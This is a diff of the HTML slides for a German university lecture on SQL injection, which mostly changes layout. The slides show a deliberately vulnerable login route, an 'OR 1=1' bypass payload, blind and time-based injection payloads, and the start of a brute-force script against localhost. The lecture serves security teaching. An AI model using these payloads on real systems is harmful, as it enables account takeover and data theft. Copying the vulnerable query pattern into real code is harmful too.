@@ -210,7 +210,7 @@
 <p><img class="title-image" src="../../images/datenschutz.jpg" alt="" style="--title-image-width: 120vw; --title-image-right: -500px; --title-image-top: 0px; --title-image-height: 100vh; --title-image-object-position: right right;"></p>
 <p>Prof.&nbsp;Dr.&nbsp;Lukas Iffländer<br>
 HTW Dresden<br>
-30.06.2026</p>
+30.07.2026</p>
 </section>
 <section id="agenda" class="slide level2 content-slide agenda-slide">
 <h2>Agenda</h2>
@@ -237,7 +237,8 @@ HTW Dresden<br>
 </section>
 <section id="lernziele" class="slide level2 content-slide pdf-slide">
 <h2>Lernziele</h2>
-<h3 id="nach-dieser-vorlesung-können-sie">Nach dieser Vorlesung können Sie:</h3>
+<p><br></p>
+<h4 id="nach-dieser-vorlesung-können-sie">Nach dieser Vorlesung können Sie:</h4>
 <ol type="1">
 <li>SQL-Injection-Angriffe erkennen und erklären</li>
 <li>verschiedene Arten von SQL Injection unterscheiden</li>
@@ -247,21 +248,38 @@ HTW Dresden<br>
 </section>
 <section id="sql-injection-1" class="slide level2 content-slide pdf-slide">
 <h2>SQL Injection</h2>
-<h3 id="ziel">Ziel</h3>
+<p><br></p>
+<div title="Ziel">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Ziel</strong></p>
+</div>
+<div class="callout-content">
 <ul>
 <li>Beliebige Queries auf einer Datenbank über eine verwundbare Anwendung ausführen</li>
 <li>sensible Daten aus einer Datenbank auslesen</li>
 <li>Datenbankinhalte modifizieren</li>
 <li>administrative Funktionen ausführen</li>
-<li>ggf. Befehle direkt im Betriebssystem ausführen</li>
+<li>ggf. Befehle direkt im Betriebssystem ausführen.</li>
 </ul>
+</div>
+</div>
+</div>
+</div>
+<p><br></p>
 <p>Wie alle Command Injections ist SQL Injection möglich, wenn eine Anwendung unsichere Nutzereingaben mit SQL-Query-Templates verknüpft.</p>
 </section>
 <section id="beispiel-bank-login" class="slide level2 image-slide code-slide">
 <h2>Beispiel: Bank Login</h2>
-<p><img src="../../images/bankacc.jpg" style="height: 400px; width: 600px"></p>
+<p><br></p>
+<p><img src="../../images/bankacc.jpg" style="height: 100px; width: 300px"></p>
+<p><br></p>
 <h4 id="code">Code</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb1-1"><a href=""></a><span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span></span>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb1" data-code-line-numbers="|1|2|3|5-11"><pre class="sourceCode numberSource javascript number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb1-1"><a href=""></a><span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span></span>
 <span id="cb1-2"><a href=""></a><span class="kw">const</span> query <span class="op">=</span> <span class="vs">`SELECT * FROM users WHERE username = "</span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">"`</span></span>
 <span id="cb1-3"><a href=""></a><span class="kw">const</span> results <span class="op">=</span> db<span class="op">.</span><span class="fu">all</span>(query)</span>
 <span id="cb1-4"><a href=""></a></span>
@@ -276,6 +294,7 @@ HTW Dresden<br>
 <section id="bank-login" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="gutartige-eingabe">gutartige Eingabe</h3>
+<p><br></p>
 <h4 id="sql-template">SQL-Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb2"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb2-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="eingabe">Eingabe</h4>
@@ -286,6 +305,7 @@ HTW Dresden<br>
 <section id="bank-login-1" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="fragwürdige-eingabe-i">fragwürdige Eingabe I</h3>
+<p><br></p>
 <h4 id="sql-template-1">SQL-Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb5"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb5-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="fragwürdige-eingabe">Fragwürdige Eingabe</h4>
@@ -296,6 +316,7 @@ HTW Dresden<br>
 <section id="bank-login-2" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="fragwürdige-eingabe-ii">fragwürdige Eingabe II</h3>
+<p><br></p>
 <h4 id="sql-template-2">SQL-Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb8"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb8-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="fragwürdige-eingabe-1">Fragwürdige Eingabe</h4>
@@ -306,6 +327,7 @@ HTW Dresden<br>
 <section id="bank-login-3" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="bösartige-eingabe-i">bösartige Eingabe I</h3>
+<p><br></p>
 <h4 id="sql-template-3">SQL Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb11"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb11-1"><a href=""></a>SELECT <span class="op">*</span> FROM users WHERE username <span class="op">=</span> <span class="st">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="bösartige-eingabe">Bösartige Eingabe</h4>
@@ -316,17 +338,19 @@ HTW Dresden<br>
 <section id="bank-login-4" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="bösartige-eingabe-ii">bösartige Eingabe II</h3>
+<p><br></p>
 <h4 id="sql-template-4">SQL Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb14"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb14-1"><a href=""></a>SELECT <span class="op">*</span> FROM users WHERE username <span class="op">=</span> <span class="st">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="bösartige-eingabe-1">Bösartige Eingabe</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb15"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb15-1"><a href=""></a>{ <span class="dt">username</span><span class="op">:</span> <span class="st">'" OR 1=1 --'</span> } <span class="co">// 1=1 is always true</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<h3 id="resultierende-query-4">Resultierende Query</h3>
+<h4 id="resultierende-query-4">Resultierende Query</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb16"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb16-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">""</span> <span class="kw">OR</span> <span class="dv">1</span><span class="op">=</span><span class="dv">1</span> <span class="co">--"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="bank-login-5" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
-<h3 id="bösartige-eingabe-step-by-step">Bösartige Eingabe: Step-by-Step</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb17-1"><a href=""></a><span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span></span>
+<p><br></p>
+<h4 id="bösartige-eingabe-step-by-step">Bösartige Eingabe: Step-by-Step</h4>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb17" data-code-line-numbers="|1-2|4-5|7-8|10-12"><pre class="sourceCode numberSource javascript number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb17-1"><a href=""></a><span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span></span>
 <span id="cb17-2"><a href=""></a><span class="co">// { username: '" OR 1=1 --', password: '...' }</span></span>
 <span id="cb17-3"><a href=""></a></span>
 <span id="cb17-4"><a href=""></a><span class="kw">const</span> query <span class="op">=</span> <span class="vs">`SELECT * FROM users WHERE username = "</span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">"`</span></span>
@@ -342,6 +366,7 @@ HTW Dresden<br>
 <section id="bank-login-6" class="slide level2 content-slide code-slide">
 <h2>Bank Login</h2>
 <h3 id="tabula-rasa">Tabula Rasa</h3>
+<p><br></p>
 <h4 id="sql-template-5">SQL-Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb18"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb18-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="bösartige-eingabe-2">Bösartige Eingabe</h4>
@@ -352,7 +377,8 @@ HTW Dresden<br>
 <section id="app-beispiel" class="slide level2 content-slide code-slide">
 <h2>App-Beispiel</h2>
 <h3 id="verwundbarer-code">Verwundbarer Code</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb21"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb21-1"><a href=""></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">'/login'</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb21" data-code-line-numbers="|1|2-4|6|7-11|12-15"><pre class="sourceCode numberSource javascript number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb21-1"><a href=""></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">'/login'</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
 <span id="cb21-2"><a href=""></a>    <span class="kw">const</span> { username<span class="op">,</span> password } <span class="op">=</span> req<span class="op">.</span><span class="at">body</span></span>
 <span id="cb21-3"><a href=""></a>    <span class="kw">const</span> query <span class="op">=</span></span>
 <span id="cb21-4"><a href=""></a>        <span class="vs">`SELECT * FROM users WHERE username = "</span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">" AND password = "</span><span class="sc">${</span>password<span class="sc">}</span><span class="vs">"`</span></span>
@@ -374,6 +400,7 @@ HTW Dresden<br>
 <section id="app-beispiel-1" class="slide level2 content-slide code-slide">
 <h2>App-Beispiel</h2>
 <h3 id="verwundbarer-code-1">Verwundbarer Code</h3>
+<p><br></p>
 <h4 id="template">Template</h4>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb22"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb22-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users</span>
 <span id="cb22-2"><a href=""></a><span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span> <span class="kw">AND</span> <span class="kw">password</span> <span class="op">=</span> <span class="ot">"${password}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
@@ -386,6 +413,7 @@ HTW Dresden<br>
 </section>
 <section id="implementierungsbesonderheiten" class="slide level2 content-slide code-slide">
 <h2>Implementierungsbesonderheiten</h2>
+<p><br></p>
 <div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb23"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb23-1"><a href=""></a>db<span class="op">.</span><span class="fu">exec</span>(<span class="vs">`INSERT INTO logs VALUES ("Login attempt from </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">")`</span>)</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <ul>
 <li><p>Anders als <code>db.get</code> kann <code>db.exec</code> mehrere Queries ausführen</p></li>
@@ -403,44 +431,89 @@ HTW Dresden<br>
 <section id="blinde-sql-injection" class="slide level2 content-slide pdf-slide">
 <h2>Blinde SQL Injection</h2>
 <h3 id="konzept">Konzept</h3>
+<p><br></p>
 <ul>
 <li>Wenn die Datenbank keine Daten auf der Webseite ausgibt, muss ein Angreifer Daten durch eine Reihe wahrer oder falscher Fragen stehlen.</li>
 <li>Die Webanwendung kann allgemeine Fehlermeldungen anzeigen und trotzdem anfällig sein.</li>
 </ul>
-<h3 id="ziel-1">Ziel</h3>
+<div title="Ziel">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Ziel</strong></p>
+</div>
+<div class="callout-content">
 <ul>
-<li><p>Wahr-oder-falsch-Fragen an die Datenbank stellen und die Antwort anhand der Reaktion der Anwendung erraten.</p></li>
-<li><p>Blinde SQL Injection ist deutlich schwerer auszunutzen, aber nicht unmöglich.</p></li>
+<li>Wahr-oder-falsch-Fragen an die Datenbank stellen und die Antwort anhand der Reaktion der Anwendung erraten.</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<ul>
+<li>Deutlich schwerer auszunutzen aber nicht unmöglich</li>
 </ul>
 </section>
 <section id="blinde-sql-injection-1" class="slide level2 content-slide code-slide">
 <h2>Blinde SQL Injection</h2>
 <h3 id="arten">Arten</h3>
-<h4 id="inhaltsbasiert">Inhaltsbasiert</h4>
+<p><br></p>
+<div title="Inhaltsbasiert">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Inhaltsbasiert</strong></p>
+</div>
+<div class="callout-content">
 <ul>
-<li>Die Anwendung gibt unterschiedliche Antworten basierend auf dem Inhalt der Antwort.</li>
+<li>Die Anwendung gibt unterschiedliche Antworten basierend auf dem Inhalt der Antwort</li>
+<li><code>if (content == "true") { ... }</code></li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb24-1"><a href=""></a><span class="cf">if</span> (content <span class="op">==</span> <span class="st">"true"</span>) { <span class="op">...</span> }</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
-<h4 id="zeitbasiert">Zeitbasiert</h4>
+</div>
+</div>
+</div>
+</div>
+<div title="Zeitbasiert">
+<div class="callout callout-note callout-titled callout-style-default">
+<div class="callout-body">
+<div class="callout-title">
+<div class="callout-icon-container">
+<i class="callout-icon"></i>
+</div>
+<p><strong>Zeitbasiert</strong></p>
+</div>
+<div class="callout-content">
 <ul>
-<li>Die Datenbank kurz warten lassen, wenn eine Bedingung erfüllt ist.</li>
-<li>Unterschiedliche Antwortzeiten können auf eine erfolgreiche Abfrage hinweisen.</li>
+<li>Die datenbank dazu bringen, kurz zu warten, wenn eine Bedingung erfüllt ist</li>
+<li>Unterschiedliche Antwortzeiten können auf eine erfolgreiche Abfrage hinweisen</li>
 </ul>
+</div>
+</div>
+</div>
+</div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte blinde SQL Injection</h2>
 <h3 id="was-herausfinden">Was herausfinden?</h3>
+<p><br></p>
 <h4 id="sql-template-6">SQL Template</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb25"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb25-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb24"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb24-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users <span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"${username}"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="bösartige-eingabe-3">Bösartige Eingabe</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb26-1"><a href=""></a>{ <span class="dt">username</span><span class="op">:</span> <span class="st">'alice" AND SUBSTR(password,1,1) = CHAR(112) --'</span> }</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb25"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb25-1"><a href=""></a>{ <span class="dt">username</span><span class="op">:</span> <span class="st">'alice" AND SUBSTR(password,1,1) = CHAR(112) --'</span> }</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="resultierende-query-6">Resultierende Query</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb27-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users</span>
-<span id="cb27-2"><a href=""></a><span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"alice"</span> <span class="kw">AND</span> <span class="fu">SUBSTR</span>(<span class="kw">password</span>,<span class="dv">1</span>,<span class="dv">1</span>) <span class="op">=</span> <span class="dt">CHAR</span>(<span class="dv">112</span>) <span class="co">--"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb26"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb26-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users</span>
+<span id="cb26-2"><a href=""></a><span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"alice"</span> <span class="kw">AND</span> <span class="fu">SUBSTR</span>(<span class="kw">password</span>,<span class="dv">1</span>,<span class="dv">1</span>) <span class="op">=</span> <span class="dt">CHAR</span>(<span class="dv">112</span>) <span class="co">--"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-1" class="slide level2 content-slide pdf-slide">
 <h2>Zeitbasierte blinde SQL Injection</h2>
 <h3 id="idee">Idee</h3>
+<p><br></p>
 <ul>
 <li>Erinnerung: Wir können die Antwort der Datenbank nicht direkt sehen und das Verhalten der Anwendung ist nicht sichtbar.</li>
 <li>Wir brauchen einen Weg, das Verhalten beobachtbar zu machen.</li>
@@ -453,105 +526,113 @@ HTW Dresden<br>
 <section id="zeitbasierte-blinde-sql-injection-2" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="umsetzungsmöglichkeiten">Umsetzungsmöglichkeiten</h3>
+<p><br></p>
 <ul>
 <li>Langsame SQL Query</li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb28-1"><a href=""></a><span class="kw">SELECT</span> <span class="dv">123</span><span class="op">=</span><span class="kw">LIKE</span>(<span class="st">'ABCDEFG'</span>,<span class="fu">UPPER</span>(HEX(RANDOMBLOB(<span class="dv">100000000</span><span class="op">/</span><span class="dv">2</span>))))</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb27"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb27-1"><a href=""></a><span class="kw">SELECT</span> <span class="dv">123</span><span class="op">=</span><span class="kw">LIKE</span>(<span class="st">'ABCDEFG'</span>,<span class="fu">UPPER</span>(HEX(RANDOMBLOB(<span class="dv">100000000</span><span class="op">/</span><span class="dv">2</span>))))</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <ul>
 <li>Das SQL-Äquivalent einer if-Abfrage CASE nutzen, um die langsame Query nur auszulösen, wenn die Antwort auf unsere Frage wahr ist:</li>
 </ul>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb29-1"><a href=""></a><span class="kw">SELECT</span> <span class="cf">CASE</span> expression</span>
-<span id="cb29-2"><a href=""></a>  <span class="cf">WHEN</span> cond <span class="cf">THEN</span> slow</span>
-<span id="cb29-3"><a href=""></a>  <span class="cf">ELSE</span> speedy</span>
-<span id="cb29-4"><a href=""></a><span class="cf">END</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb28"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb28-1"><a href=""></a><span class="kw">SELECT</span> <span class="cf">CASE</span> expression</span>
+<span id="cb28-2"><a href=""></a>  <span class="cf">WHEN</span> cond <span class="cf">THEN</span> slow</span>
+<span id="cb28-3"><a href=""></a>  <span class="cf">ELSE</span> speedy</span>
+<span id="cb28-4"><a href=""></a><span class="cf">END</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-umsetzung" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Umsetzung</h2>
+<p><br></p>
 <h4 id="bösartige-eingabe-4">Bösartige Eingabe</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb30"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb30-1"><a href=""></a>{</span>
-<span id="cb30-2"><a href=""></a>  <span class="dt">username</span><span class="op">:</span> <span class="vs">`alice" AND CASE SUBSTR(password,1,1)</span></span>
-<span id="cb30-3"><a href=""></a><span class="vs">    WHEN CHAR(112) THEN</span></span>
-<span id="cb30-4"><a href=""></a><span class="vs">      123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</span></span>
-<span id="cb30-5"><a href=""></a><span class="vs">    ELSE null</span></span>
-<span id="cb30-6"><a href=""></a><span class="vs">  END --`</span></span>
-<span id="cb30-7"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb29"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb29-1"><a href=""></a>{</span>
+<span id="cb29-2"><a href=""></a>  <span class="dt">username</span><span class="op">:</span> <span class="vs">`alice" AND CASE SUBSTR(password,1,1)</span></span>
+<span id="cb29-3"><a href=""></a><span class="vs">    WHEN CHAR(112) THEN</span></span>
+<span id="cb29-4"><a href=""></a><span class="vs">      123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))</span></span>
+<span id="cb29-5"><a href=""></a><span class="vs">    ELSE null</span></span>
+<span id="cb29-6"><a href=""></a><span class="vs">  END --`</span></span>
+<span id="cb29-7"><a href=""></a>}</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <h4 id="resultierende-query-7">Resultierende Query</h4>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb31"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb31-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users</span>
-<span id="cb31-2"><a href=""></a><span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"alice"</span> <span class="kw">AND</span> <span class="cf">CASE</span> <span class="fu">SUBSTR</span>(<span class="kw">password</span>,<span class="dv">1</span>,<span class="dv">1</span>)</span>
-<span id="cb31-3"><a href=""></a>  <span class="cf">WHEN</span> <span class="dt">CHAR</span>(<span class="dv">112</span>) <span class="cf">THEN</span></span>
-<span id="cb31-4"><a href=""></a>    <span class="dv">123</span><span class="op">=</span><span class="kw">LIKE</span>(<span class="st">'ABCDEFG'</span>,<span class="fu">UPPER</span>(HEX(RANDOMBLOB(<span class="dv">100000000</span><span class="op">/</span><span class="dv">2</span>))))</span>
-<span id="cb31-5"><a href=""></a>  <span class="cf">ELSE</span> <span class="kw">null</span></span>
-<span id="cb31-6"><a href=""></a><span class="cf">END</span> <span class="co">--"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb30"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb30-1"><a href=""></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> users</span>
+<span id="cb30-2"><a href=""></a><span class="kw">WHERE</span> username <span class="op">=</span> <span class="ot">"alice"</span> <span class="kw">AND</span> <span class="cf">CASE</span> <span class="fu">SUBSTR</span>(<span class="kw">password</span>,<span class="dv">1</span>,<span class="dv">1</span>)</span>
+<span id="cb30-3"><a href=""></a>  <span class="cf">WHEN</span> <span class="dt">CHAR</span>(<span class="dv">112</span>) <span class="cf">THEN</span></span>
+<span id="cb30-4"><a href=""></a>    <span class="dv">123</span><span class="op">=</span><span class="kw">LIKE</span>(<span class="st">'ABCDEFG'</span>,<span class="fu">UPPER</span>(HEX(RANDOMBLOB(<span class="dv">100000000</span><span class="op">/</span><span class="dv">2</span>))))</span>
+<span id="cb30-5"><a href=""></a>  <span class="cf">ELSE</span> <span class="kw">null</span></span>
+<span id="cb30-6"><a href=""></a><span class="cf">END</span> <span class="co">--"</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="zeitbasierte-blinde-sql-injection-3" class="slide level2 content-slide code-slide">
 <h2>Zeitbasierte Blinde SQL Injection</h2>
 <h3 id="passwort-mit-brute-force-erraten">Passwort mit Brute-Force erraten</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb32"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb32-1"><a href=""></a><span class="kw">const</span> got <span class="op">=</span> <span class="pp">require</span>(<span class="st">'got'</span>)</span>
-<span id="cb32-2"><a href=""></a><span class="kw">const</span> CHAR_START <span class="op">=</span> <span class="dv">32</span> <span class="co">// space</span></span>
-<span id="cb32-3"><a href=""></a><span class="kw">const</span> CHAR_END <span class="op">=</span> <span class="dv">126</span> <span class="co">// tilde</span></span>
-<span id="cb32-4"><a href=""></a><span class="kw">const</span> URL <span class="op">=</span> <span class="st">'http://localhost:8000/login'</span></span>
-<span id="cb32-5"><a href=""></a><span class="kw">const</span> USERNAME <span class="op">=</span> <span class="bu">process</span><span class="op">.</span><span class="at">argv</span>[<span class="dv">2</span>] <span class="op">||</span> <span class="st">'alice'</span></span>
-<span id="cb32-6"><a href=""></a><span class="kw">const</span> TIME_THRESHOLD <span class="op">=</span> <span class="dv">50</span></span>
-<span id="cb32-7"><a href=""></a></span>
-<span id="cb32-8"><a href=""></a><span class="kw">let</span> password <span class="op">=</span> <span class="st">''</span></span>
-<span id="cb32-9"><a href=""></a></span>
-<span id="cb32-10"><a href=""></a><span class="fu">init</span>()</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<p><br></p>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb31"><pre class="sourceCode numberSource js number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb31-1"><a href=""></a><span class="kw">const</span> got <span class="op">=</span> <span class="pp">require</span>(<span class="st">'got'</span>)</span>
+<span id="cb31-2"><a href=""></a><span class="kw">const</span> CHAR_START <span class="op">=</span> <span class="dv">32</span> <span class="co">// space</span></span>
+<span id="cb31-3"><a href=""></a><span class="kw">const</span> CHAR_END <span class="op">=</span> <span class="dv">126</span> <span class="co">// tilde</span></span>
+<span id="cb31-4"><a href=""></a><span class="kw">const</span> URL <span class="op">=</span> <span class="st">'http://localhost:8000/login'</span></span>
